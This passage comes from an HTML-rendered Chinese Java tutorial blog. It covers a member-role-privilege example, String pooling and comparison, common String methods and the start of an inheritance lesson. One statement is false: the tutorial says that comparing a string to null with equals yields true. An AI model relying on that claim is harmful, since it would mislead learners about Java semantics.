class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Member</span> <span class="variable">memA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Member</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="type">Member</span> <span class="variable">memB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Member</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        <span class="type">Role</span> <span class="variable">roleA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Role</span>(<span class="number">1L</span>, <span class="string">&quot;系统服务&quot;</span>);</span><br><span class="line">        <span class="type">Role</span> <span class="variable">roleB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Role</span>(<span class="number">2L</span>, <span class="string">&quot;备份服务&quot;</span>);</span><br><span class="line">        <span class="type">Role</span> <span class="variable">roleC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Role</span>(<span class="number">3L</span>, <span class="string">&quot;人事管理&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">1000L</span>, <span class="string">&quot;系统初始化&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">1001L</span>, <span class="string">&quot;系统环境还原&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">1002L</span>, <span class="string">&quot;系统环境修改&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priD</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">2000L</span>, <span class="string">&quot;备份员工数据&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">2001L</span>, <span class="string">&quot;备份部分数据&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priF</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">2002L</span>, <span class="string">&quot;备份公文数据&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priG</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">3000L</span>, <span class="string">&quot;增加员工&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priH</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">3001L</span>, <span class="string">&quot;编辑员工&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priI</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">3002L</span>, <span class="string">&quot;浏览员工&quot;</span>);</span><br><span class="line">        <span class="type">Privilege</span> <span class="variable">priJ</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Privilege</span>(<span class="number">3003L</span>, <span class="string">&quot;员工离职&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//增加角色和权限</span></span><br><span class="line">        roleA.setPrivileges(<span class="keyword">new</span> <span class="title class_">Privilege</span>[]&#123;priA, priB, priC&#125;);</span><br><span class="line">        roleB.setPrivileges(<span class="keyword">new</span> <span class="title class_">Privilege</span>[]&#123;priD, priE, priF&#125;);</span><br><span class="line">        roleC.setPrivileges(<span class="keyword">new</span> <span class="title class_">Privilege</span>[]&#123;priG, priH, priI, priJ&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//增加权限与角色对应</span></span><br><span class="line">        priA.setRole(roleA);</span><br><span class="line">        priB.setRole(roleA);</span><br><span class="line">        priC.setRole(roleA);</span><br><span class="line">        priD.setRole(roleB);</span><br><span class="line">        priE.setRole(roleB);</span><br><span class="line">        priF.setRole(roleB);</span><br><span class="line">        priG.setRole(roleC);</span><br><span class="line">        priH.setRole(roleC);</span><br><span class="line">        priI.setRole(roleC);</span><br><span class="line">        priJ.setRole(roleC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//增加用户与角色的对应关系</span></span><br><span class="line">        memA.setRoles(<span class="keyword">new</span> <span class="title class_">Role</span>[]&#123;roleA, roleB&#125;);</span><br><span class="line">        memB.setRoles(<span class="keyword">new</span> <span class="title class_">Role</span>[]&#123;roleA, roleB, roleC&#125;);</span><br><span class="line">        roleA.setMembers(<span class="keyword">new</span> <span class="title class_">Member</span>[]&#123;memA, memB&#125;);</span><br><span class="line">        roleB.setMembers(<span class="keyword">new</span> <span class="title class_">Member</span>[]&#123;memA, memB&#125;);</span><br><span class="line">        roleC.setMembers(<span class="keyword">new</span> <span class="title class_">Member</span>[]&#123;memB&#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---通过用户查看信息---&quot;</span>);</span><br><span class="line">        System.out.println(memB.getInfo());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; memB.getRoles().length; x++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\t|- &quot;</span> + memB.getRoles()[x].getInfo());</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">0</span>; y &lt; memB.getRoles()[x].getPrivileges().length; y++) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t|-&quot;</span> + memB.getRoles()[x].getPrivileges()[y].getInfo());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---通过角色查看信息---&quot;</span>);</span><br><span class="line">        System.out.println(memB.getInfo());</span><br><span class="line">        System.out.println(<span class="string">&quot;\t|- 浏此次角色下的所有权限信息：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; roleB.getPrivileges().length; x++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t|- &quot;</span> + roleB.getPrivileges()[x].getInfo());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;\t|- 浏览此角色下的所有用户信息： &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; roleB.getMembers().length; x++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t|- &quot;</span> + roleB.getMembers()[x].getInfo());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---通过权限查看信息---&quot;</span>);</span><br><span class="line">        System.out.println(priA.getInfo());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; priA.getRole().getMembers().length;x++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\t| &quot;</span>+ priA.getRole().getMembers()[x].getInfo());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="String类特点分析"><a href="#String类特点分析" class="headerlink" title="String类特点分析"></a>String类特点分析</h4><h5 id="String简介"><a href="#String简介" class="headerlink" title="String简介"></a>String简介</h5><p>​    JDK1.8以前String保存的是字符数组，JDK1.9以后String保存的是字节数组。</p><p>​    1.8:private final char value[]</p><p>​    1.9:private final byte value[]</p><p>​    字符串是对数组的一种包装应用，所以无法改变里面的内容。</p><p>​    Sting可以直接赋值，也可以是使用构造方法赋值。</p><p>​    String str = new String(“test”);</p><h5 id="String比较"><a href="#String比较" class="headerlink" title="String比较"></a>String比较</h5><p>​    ==进行的是数值比较，用在对象上是比较内存空间的地址。</p><p>​    内容比较需要用equals，strA.equals(strB)。</p><p>​    equals方法里提供有一个可以回避null的功能，需要把字符串对象写在前面</p><p>​    如果strb=null，stra.equals(strb)，结果为true。</p><h5 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h5><p>​    使用“”定义的其实是一个String类的匿名对象。</p><h5 id="String类对象两种实例化方式比较"><a href="#String类对象两种实例化方式比较" class="headerlink" title="String类对象两种实例化方式比较"></a>String类对象两种实例化方式比较</h5><h6 id="1、直接赋值实例化"><a href="#1、直接赋值实例化" class="headerlink" title="1、直接赋值实例化"></a>1、直接赋值实例化</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">strA</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">strB</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">System.out.println(strA == strB);</span><br></pre></td></tr></table></figure><p>​    结果为true，之所以出现这样的原因是Java程序底层里有一个字符串池。在strA在堆内存中产生数值后，会把这个数值方法池中（也在堆内存里），然后strB创建时，会在池中查找有没有test，有的话直接指向。那么现在，即使是==判断地址，也是true了。</p><h6 id="2、构造方法实例化"><a href="#2、构造方法实例化" class="headerlink" title="    2、构造方法实例化"></a><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73524.jpg"                      alt="String比较"                >    2、构造方法实例化</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073525.jpg"                      alt="String"                ></p><h6 id="3、两种比较"><a href="#3、两种比较" class="headerlink" title="3、两种比较"></a>3、两种比较</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">strA</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">strB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">System.out.println(strA == strB);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073526.jpg"                      alt="image-20220323164145386"                ></p><p>​    除了以上特点外，在使用构造方法实例化String类对象时不会出现自动保存到字符串对象池里的特点。</p><p>​    构造方法实例化对象实际上是属于一种自己专用的内存空间，但是在String类里买，也提供手工入池的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">strA</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">strB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;test&quot;</span>).intern();</span><br><span class="line">System.out.println(strA == strB);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>​    直接赋值：创建一个实例化对象，并且可以自动保存到对象池之中，以实现该字符串实例的重用。</p><p>​    构造方法：会产生两个实例化对象，并且不会自动入池，无法实现对象重用，但可手工入池。</p><h5 id="String对象（常量）池"><a href="#String对象（常量）池" class="headerlink" title="String对象（常量）池"></a>String对象（常量）池</h5><p>​    对象池的主要目的是实现数据的共享处理。以String对象池为例，里面的内容是为了重用。Java中对象（常量）池可以分为两种；</p><h6 id="1、静态常量池："><a href="#1、静态常量池：" class="headerlink" title="1、静态常量池："></a>1、静态常量池：</h6><p>​        程序（*.class）在加载的时候会自动将此程序之中保存的字符串、普通的常量、类和方法的信息等等，全部进行分配。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">strA</span> <span class="operator">=</span> <span class="string">&quot;test1w&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">strB</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>+<span class="string">&quot;1w&quot;</span>;</span><br><span class="line">System.out.println(strA == strB);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><h6 id="2、运行时常量池："><a href="#2、运行时常量池：" class="headerlink" title="2、运行时常量池："></a>2、运行时常量池：</h6><p>​        当一个程序(*.class)加载之后，里面可能有一些变量例如用户输入等等，这个时候提供的常量池。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;1w&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strA</span> <span class="operator">=</span> <span class="string">&quot;test1w&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">strB</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span> + info;</span><br><span class="line">System.out.println(strA == strB);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><h5 id="字符串内容不可修改"><a href="#字符串内容不可修改" class="headerlink" title="字符串内容不可修改"></a>字符串内容不可修改</h5><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073529.jpg"                      alt="image-20220323171851510"                >    </p><p>​    String类不要在开发频繁修改，因为会产生大量垃圾空间。</p><h5 id="Java中的主方法"><a href="#Java中的主方法" class="headerlink" title="Java中的主方法"></a>Java中的主方法</h5><p>​    public static void main(String args[])</p><p>​    public：描述的是一种访问权限，主方法是一切的开始点，开始点一定是公共的；</p><p>​    static：程序的执行是通过类名称完成的，所以此方法是类直接调用的；</p><p>​    void：主方法是一切起点，一旦开始就不能返回了；</p><p>​    main：是一个系统定义好的方法名称；</p><p>​    String args[]：是一个字符串数组，可以实现程序启动参数的输出。</p><hr><h4 id="String类常用方法"><a href="#String类常用方法" class="headerlink" title="String类常用方法"></a>String类常用方法</h4><h5 id="字符串与字符数组"><a href="#字符串与字符数组" class="headerlink" title="字符串与字符数组"></a>字符串与字符数组</h5><p>​    处理中文一般用char。</p><p>​    JDK1.9以前，所有的String都利用了字符数组实现了包装的处理，所以在String类里有相应的转换处理方法。字符串中的索引下标都是从0开始的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">        <span class="type">char</span>[] result = str.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;x&lt;result.length;x++)&#123;</span><br><span class="line">            result[x] -= <span class="number">32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newstr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(result);</span><br><span class="line">        System.out.println(newstr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">        System.out.println(isNumber(str)?<span class="string">&quot;由数字组成&quot;</span>:<span class="string">&quot;不由数字组成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isNumber</span><span class="params">(String str)</span>&#123;</span><br><span class="line">        <span class="type">char</span>[] result = str.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x= <span class="number">0</span>;x&lt; result.length;x++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (result[x] &lt; <span class="string">&#x27;0&#x27;</span> || result[x] &gt; <span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="字符串与字节数组"><a href="#字符串与字节数组" class="headerlink" title="字符串与字节数组"></a>字符串与字节数组</h5><p>​    字符串与字节数字转换时，主要目的是二进制数据传输或着涉及编码转换。</p><p>​    public byte[] getBytes(String charsetName) throws UnsupportedEncodingException涉及编码转换是最重要的方法之一。</p><h5 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h5><p>​    compareTo()方法非常重要。</p><h5 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h5><p>​    contain()//是否存在</p><p>​    indexOf()//查找位置</p><p>​    starsWith()//判断开头</p><p>​    endsWith()//判断结尾</p><h5 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h5><p>​    replaceAll()//全部替换</p><p>​    replaceFirst()//替换首个</p><h5 id="字符串拆分"><a href="#字符串拆分" class="headerlink" title="字符串拆分"></a>字符串拆分</h5><p>​    split()//全部拆分</p><p>​    split(string,2)//拆成两个</p><p>​    特殊符号”\\转译”</p><h5 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h5><p>​    substring()</p><h5 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h5><p>​    format()</p><h5 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h5><p>​    concat()，intern()，isEmpty()，trim()//去除左右空格，toUpperCase()，toLowerCase()，Java中没有首字母大写的方法，可自定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StringUtil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">initcap</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(str))&#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (str.length() == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> str.toUpperCase(Locale.ROOT);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.substring(<span class="number">0</span>,<span class="number">1</span>).toUpperCase(Locale.ROOT) + str.substring(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(StringUtil.initcap(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">        System.out.println(StringUtil.initcap(<span class="string">&quot;m&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="继承的定义与使用"><a href="#继承的定义与使用" class="headerlink" title="继承的定义与使用"></a>继承的定义与使用</h4><h5 id="继承问题引出"><a href="#继承问题引出" class="headerlink" title="继承问题引出"></a>继承问题引出</h5><p>​    继承性的主要特点：可以扩充已有类的功能。</p><p>​    良好的代码是结构合理，利于维护，可重用行很高，如果只用之前的，不可避免面对重复性。</p><p>​    传统定义写法，大量重复：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String school;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSchool</span><span class="params">(String school)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.school = school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSchool</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> school;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="继承实现"><a href="#继承实现" class="headerlink" title="继承实现"></a>继承实现</h5><p>​    由extends关键字完成，class 子类 extends 父类{}</p><p>​    子类可称为派生类，父类成为超类。</p><p>​    子类可以重用父类结构，可以定义新的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String school;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSchool</span><span class="params">(String school)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.school = school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSchool</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> school;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 